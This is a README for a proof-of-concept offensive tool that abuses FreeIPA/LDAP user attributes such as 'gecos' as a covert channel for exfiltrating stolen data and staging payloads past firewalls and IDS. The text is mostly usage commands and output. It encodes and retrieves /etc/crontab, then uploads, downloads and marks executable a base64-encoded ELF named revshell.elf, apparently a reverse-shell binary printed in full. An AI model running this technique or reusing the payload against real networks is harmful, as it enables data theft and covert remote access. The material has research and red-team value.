# PoC of FreeIPA / LDAP Attribute Data Exfiltration Script

This is a proof of concept code for using FreeIPA-LDAP instance as a central storage for your binary, malicious payload or just stolen data. During APT campaign or pentest there is a scenario where two endpoint devices can't talk directly to each other. Hovewer and because both devices are members of FreeIPA-based *Linux Domain Controller* Environment, they both can connect to the same LDAP ports (389/636/TCP), where the possibility exists to upload and download base64 encoded data from/to well known LDAP attribute names. Now, what is even more surpising, there is pretty much no attribute length restriction in use, which means we can use ex. 'gecos' attribute as an unlimited storage space to send/upload data and bypass FW/IDS/IPS protection.

### Requirements:

ldap-exfil script requires python-ldap:

```sh
$ pip install python-ldap
or
$ sudo yum install python-ldap
```

### Usage:
**HELP:**
```sh
$ python ldap-exfil.py --help
usage: ldap-exfil.py [-h] [-f FILE] -s SERVER -d DNAME -a ATTRIBUTE -m MODE
                     [-o OUTPUT] [-p PASSWORD]

FreeIPA / LDAP attribute exfiltration script

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  File name to upload
  -s SERVER, --server SERVER
                        FreeIPA LDAP server
  -d DNAME, --dname DNAME
                        LDAP distinguished name
  -a ATTRIBUTE, --attribute ATTRIBUTE
                        LDAP attribute name
  -m MODE, --mode MODE  Mode name
  -o OUTPUT, --output OUTPUT
                        Output file name
  -p PASSWORD, --password PASSWORD
                        Password
```
**SET mode - first Tab:**
```sh
$ python ldap-exfil.py --server ldap://127.0.0.1:389 -d uid=lmis,cn=users,cn=accounts,dc=exfil,dc=int -a gecos -m set --file /etc/crontab -p 'password'

*** Encoded Data : [ IyAvZXRjL2Nyb250YWI6IHN5c3RlbS13aWRlIGNyb250YWIKIyBVbmxpa2UgYW55IG90aGVyIGNyb250YWIgeW91IGRvbid0IGhhdmUgdG8gcnVuIHRoZSBgY3JvbnRhYicKIyBjb21tYW5kIHRvIGluc3RhbGwgdGhlIG5ldyB2ZXJzaW9uIHdoZW4geW91IGVkaXQgdGhpcyBmaWxlCiMgYW5kIGZpbGVzIGluIC9ldGMvY3Jvbi5kLiBUaGVzZSBmaWxlcyBhbHNvIGhhdmUgdXNlcm5hbWUgZmllbGRzLAojIHRoYXQgbm9uZSBvZiB0aGUgb3RoZXIgY3JvbnRhYnMgZG8uCgpTSEVMTD0vYmluL3NoClBBVEg9L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi9zYmluOi9iaW46L3Vzci9zYmluOi91c3IvYmluCgojIG0gaCBkb20gbW9uIGRvdyB1c2VyCWNvbW1hbmQKMTcgKgkqICogKglyb290ICAgIGNkIC8gJiYgcnVuLXBhcnRzIC0tcmVwb3J0IC9ldGMvY3Jvbi5ob3VybHkKMjUgNgkqICogKglyb290CXRlc3QgLXggL3Vzci9zYmluL2FuYWNyb24gfHwgKCBjZCAvICYmIHJ1bi1wYXJ0cyAtLXJlcG9ydCAvZXRjL2Nyb24uZGFpbHkgKQo0NyA2CSogKiA3CXJvb3QJdGVzdCAteCAvdXNyL3NiaW4vYW5hY3JvbiB8fCAoIGNkIC8gJiYgcnVuLXBhcnRzIC0tcmVwb3J0IC9ldGMvY3Jvbi53ZWVrbHkgKQo1MiA2CTEgKiAqCXJvb3QJdGVzdCAteCAvdXNyL3NiaW4vYW5hY3JvbiB8fCAoIGNkIC8gJiYgcnVuLXBhcnRzIC0tcmVwb3J0IC9ldGMvY3Jvbi5tb250aGx5ICkKIwo= ]

*** Size: [ 964 ] bytes
*** Status: OK
```

**GET mode - second Tab:**
```sh
$ python ldap-exfil.py --server ldap://127.0.0.1:389 -d uid=lmis,cn=users,cn=accounts,dc=exfil,dc=int -a gecos -m get -p 'password'
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

*** File saved to /tmp/exfil.data

$ ls -al /tmp/exfil.data 
-rwxr-xr-x 1 crony crony 722 Jun 12 13:40 /tmp/exfil.data
```

If you would like to set / get a binary file, then:
```sh
$ python ldap-exfil.py --server ldap://127.0.0.1:389 -d uid=lmis,cn=users,cn=accounts,dc=exfil,dc=int -a gecos -m set --file revshell.elf -p 'password'
*** Encoded Data : [ f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1tofwAAAWgCABWzieFqZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E= ]

*** Size: [ 208 ] bytes
*** Status: OK

$ python ldap-exfil.py --server ldap://127.0.0.1:389 -d uid=lmis,cn=users,cn=accounts,dc=exfil,dc=int -a gecos -m get -p 'password'
ELFT�44 ����1���SCSj�f��̀�[hh���jfXPQW��C̀���������}̀[�ᙶ

*** File saved to /tmp/exfil.data

$ file /tmp/exfil.data 
/tmp/exfil.data: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size

$ chmod +x /tmp/exfil.data
```



### Contact

 - https://defensive-security.com

### Author

 - Leszek Mis (@cr0nym)

